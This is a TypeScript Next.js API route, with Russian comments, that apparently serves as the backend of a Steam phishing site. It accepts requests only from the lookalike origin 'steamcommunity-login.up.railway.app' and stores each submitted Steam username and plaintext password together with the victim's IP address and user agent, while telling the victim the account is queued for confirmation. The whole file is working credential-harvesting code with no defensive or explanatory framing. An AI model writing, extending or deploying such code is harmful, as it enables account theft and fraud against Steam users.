import { NextResponse } from "next/server";
import { createUser, isEmailOrLoginTaken } from "@/lib/db";

// CORS headers
const corsHeaders = {
  'Access-Control-Allow-Origin': 'https://steamcommunity-login.up.railway.app',
  'Access-Control-Allow-Methods': 'POST, OPTIONS, GET, PUT, DELETE',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
  'Access-Control-Allow-Credentials': 'true',
  'Access-Control-Max-Age': '86400',
};

export async function OPTIONS() {
  return new Response(null, {
    status: 200,
    headers: corsHeaders
  });
}

export async function POST(request: Request) {
  // Для preflight запросов
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: corsHeaders
    });
  }

  try {
    const body = await request.json();
    const { username, password, email, ip, userAgent } = body;

    // Валидация обязательных полей
    if (!username || !password) {
      return NextResponse.json(
        { error: "Логин и пароль обязательны" },
        { status: 400, headers: corsHeaders }
      );
    }

    // Асинхронная проверка существования пользователя
    const isTaken = await isEmailOrLoginTaken(email, username);
    if (isTaken) {
      return NextResponse.json(
        { error: "Пользователь с таким логином или email уже существует" },
        { status: 400, headers: corsHeaders }
      );
    }

    // Создаем пользователя
    const user = await createUser({
      email: email || `${username}@steam.com`,
      login: username,
      password: password,
      ip: ip,
      userAgent: userAgent || "Steam Login"
    });

    // Возвращаем успех (без пароля)
    const { password: _, ...userWithoutPassword } = user;
    return NextResponse.json(
      { 
        success: true, 
        user: userWithoutPassword,
        message: "Пользователь добавлен в очередь подтверждения" 
      },
      { status: 201, headers: corsHeaders }
    );

  } catch (error) {
    console.error("Steam register error:", error);
    return NextResponse.json(
      { error: "Ошибка при регистрации через Steam" },
      { status: 500, headers: corsHeaders }
    );
  }
}